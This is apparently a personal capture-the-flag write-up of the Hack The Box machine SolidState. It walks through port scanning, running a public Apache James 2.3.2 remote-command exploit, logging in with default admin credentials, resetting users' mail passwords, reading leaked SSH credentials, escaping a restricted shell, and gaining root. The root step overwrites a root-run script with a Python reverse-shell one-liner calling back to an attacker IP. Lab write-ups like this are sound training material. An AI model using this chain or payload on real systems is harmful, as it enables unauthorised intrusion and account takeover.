#nmapscan 
```
Starting Nmap 7.91 ( https://nmap.org ) at 2021-07-30 09:38 EDT
Nmap scan report for 10.129.29.189
Host is up (0.19s latency).
Not shown: 996 closed ports
PORT    STATE SERVICE VERSION
22/tcp  open  ssh     OpenSSH 7.4p1 Debian 10+deb9u1 (protocol 2.0)
| ssh-hostkey: 
|   2048 77:00:84:f5:78:b9:c7:d3:54:cf:71:2e:0d:52:6d:8b (RSA)
|   256 78:b8:3a:f6:60:19:06:91:f5:53:92:1d:3f:48:ed:53 (ECDSA)
|_  256 e4:45:e9:ed:07:4d:73:69:43:5a:12:70:9d:c4:af:76 (ED25519)
25/tcp  open  smtp?
|_smtp-commands: Couldn't establish connection on port 25
110/tcp open  pop3?
119/tcp open  nntp?
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.91%E=4%D=7/30%OT=22%CT=1%CU=43383%PV=Y%DS=2%DC=T%G=Y%TM=6104024
OS:B%P=x86_64-pc-linux-gnu)SEQ(SP=100%GCD=1%ISR=10B%TI=Z%CI=I%II=I%TS=8)OPS
OS:(O1=M54DST11NW6%O2=M54DST11NW6%O3=M54DNNT11NW6%O4=M54DST11NW6%O5=M54DST1
OS:1NW6%O6=M54DST11)WIN(W1=7120%W2=7120%W3=7120%W4=7120%W5=7120%W6=7120)ECN
OS:(R=Y%DF=Y%T=40%W=7210%O=M54DNNSNW6%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=A
OS:S%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R
OS:=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F
OS:=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%
OS:T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD
OS:=S)

Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 443/tcp)
HOP RTT       ADDRESS
1   188.49 ms 10.10.14.1
2   188.57 ms 10.129.29.189

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 381.65 seconds
```
#enumeration 
ran gobuster and got 
```
/.hta                 (Status: 403) [Size: 292]
/.htaccess            (Status: 403) [Size: 297]
/.htpasswd            (Status: 403) [Size: 297]
/assets               (Status: 301) [Size: 315] [--> http://10.129.29.189/assets/]
/images               (Status: 301) [Size: 315] [--> http://10.129.29.189/images/]
/index.html           (Status: 200) [Size: 7776]                                  
/server-status        (Status: 403) [Size: 301] 
```
in the assests directory we had a few js and css files and scss files as well.Tried to read the js or the css files but before going to read each and every file individually I tried enumerating 25,110 ,119,4555
Trying to login to each these ports I found  JAMES POP3 Server 2.3.2 running in these ports.
Now doing searchsploit I actually found 
```
Apache James Server 2.2 - SMTP Denial of Service                                                                | multiple/dos/27915.pl
Apache James Server 2.3.2 - Insecure User Creation Arbitrary File Write (Metasploit)                            | linux/remote/48130.rb
Apache James Server 2.3.2 - Remote Command Execution                                                            | linux/remote/35513.py
WheresJames Webcam Publisher Beta 2.0.0014 - Remote Buffer Overflow                                             | windows/remote/944.c
---------------------------------------------------------------------------------------------------------------- ------------------------
```
RCE exploits dude 
```
python /usr/share/exploitdb/exploits/linux/remote/35513.py 10.129.29.189

[+]Connecting to James Remote Administration Tool...
[+]Creating user...
[+]Connecting to James SMTP server...
[+]Sending payload...
[+]Done! Payload will be executed once somebody logs in.
```
reading the script and about the exploit  I found that the port 4555 has default user root:root 
link:https://crimsonglow.ca/~kjiwa/2016/06/exploiting-apache-james-2.3.2.html
```
Apache James is highly configurable and can store data files in a variety of media, including disks and databases. Apache James exposes an administration console allowing privileged users to configure and manage the server and tweak its functions. By default, the server is configured to listen for email transactions on network port 25 and administration transactions on port 4555.
```
Now I logged into port 4555 and typed help to get list of commands
Now after that we use setpassword  to change password for each and every client and
```
Login id:
root
Password:
root
Welcome root. HELP for a list of commands
help
Currently implemented commands:
help                                    display this help
listusers                               display existing accounts
countusers                              display the number of existing accounts
adduser [username] [password]           add a new user
verify [username]                       verify if specified user exist
deluser [username]                      delete existing user
setpassword [username] [password]       sets a user's password
setalias [user] [alias]                 locally forwards all email for 'user' to 'alias'
showalias [username]                    shows a user's current email alias
unsetalias [user]                       unsets an alias for 'user'
setforwarding [username] [emailaddress] forwards a user's email to another email address
showforwarding [username]               shows a user's current email forwarding
unsetforwarding [username]              removes a forward
user [repositoryname]                   change to another user repository
shutdown                                kills the current JVM (convenient when James is run as a daemon)
quit                                    close connection
listusers
Existing accounts 6
user: james
user: ../../../../../../../../etc/bash_completion.d
user: thomas
user: john
user: mindy
user: mailadmin
setpassword thomas pass
Password for thomas reset
setpassword john pass
Password for john reset
setpassword mindy pass
Password for mindy reset
setpassword mailadmin pass     
Password for mailadmin reset


```
link:https://book.hacktricks.xyz/pentesting/pentesting-pop
then  we login to pop3 to see any mails in these users
```
Return-Path: <mailadmin@localhost>
Message-ID: <9564574.1.1503422198108.JavaMail.root@solidstate>
MIME-Version: 1.0
Content-Type: text/plain; charset=us-ascii
Content-Transfer-Encoding: 7bit
Delivered-To: john@localhost
Received: from 192.168.11.142 ([192.168.11.142])
          by solidstate (JAMES SMTP Server 2.3.2) with SMTP ID 581
          for <john@localhost>;
          Tue, 22 Aug 2017 13:16:20 -0400 (EDT)
Date: Tue, 22 Aug 2017 13:16:20 -0400 (EDT)
From: mailadmin@localhost
Subject: New Hires access
John, 

Can you please restrict mindy's access until she gets read on to the program. Also make sure that you send her a tempory password to login to her accounts.

Thank you in advance.

Respectfully,
James
```
this is what we get from john's mail 
So let us see mindy's mail
and we get the ssh creds
```
Message-ID: <16744123.2.1503422270399.JavaMail.root@solidstate>
MIME-Version: 1.0
Content-Type: text/plain; charset=us-ascii
Content-Transfer-Encoding: 7bit
Delivered-To: mindy@localhost
Received: from 192.168.11.142 ([192.168.11.142])
          by solidstate (JAMES SMTP Server 2.3.2) with SMTP ID 581
          for <mindy@localhost>;
          Tue, 22 Aug 2017 13:17:28 -0400 (EDT)
Date: Tue, 22 Aug 2017 13:17:28 -0400 (EDT)
From: mailadmin@localhost
Subject: Your Access

Dear Mindy,


Here are your ssh credentials to access the system. Remember to reset your password after your first login. 
Your access is restricted at the moment, feel free to ask your supervisor to add any commands you need to your path. 

username: mindy
pass: P@55W0rd1!2@

Respectfully,
James
```

We get logged in  and we have the user flag but we can't run any other commands
it was a restricted shell and on doing echo $SHELL it was a rbash shell.
link:https://www.hacknos.com/rbash-escape-rbash-restricted-shell-escape/
To escape the rbash tried every trick in this article but nothing worked as it had no text editors or prog language access.
then i tried rbash to bash :
link:https://gist.github.com/PSJoshi/04c0e239ac7b486efb3420db4086e290
```ssh mindy@ip "bash --noprofile"```
#rootescalation 
no sudo command was there neither were any SUID binaries
and crontab was not also there so without any 2nd thought ran linpeas
and first thing i generally see after running linpeas is any SUID or any group writable file
and we got a lot of writeable files
```
/dev/mqueue                                                                                                                                       
/dev/shm
/home/mindy
/opt/tmp.py
/run/lock
/run/user/1001
/run/user/1001/gnupg
/run/user/1001/systemd
/run/user/1001/systemd/transient
/tmp
/tmp/.font-unix
/tmp/.ICE-unix
/tmp/.Test-unix
/tmp/.X11-unix
/tmp/.XIM-unix
/var/tmp
```
now we get this file tmp.py
that is writable but executes as root
```-rwxrwxrwx  1 root root  105 Aug 22  2017 tmp.py
```
so we overwrite this file with out own python exploit
```echo 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.25",9999));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);' > tmp.py```
and then ran it with nc listener open 
and we got our root shell
```
# id
uid=0(root) gid=0(root) groups=0(root)
# cat /root/root.txt
4f4afb55463c3bc79ab1e906b074953d
```

BEST BOX REVISING THE MAIL SERVERS LIKE POP3 or PORT 4555

link:https://www.exploit-db.com/docs/english/44592-linux-restricted-shell-bypass-guide.pdf


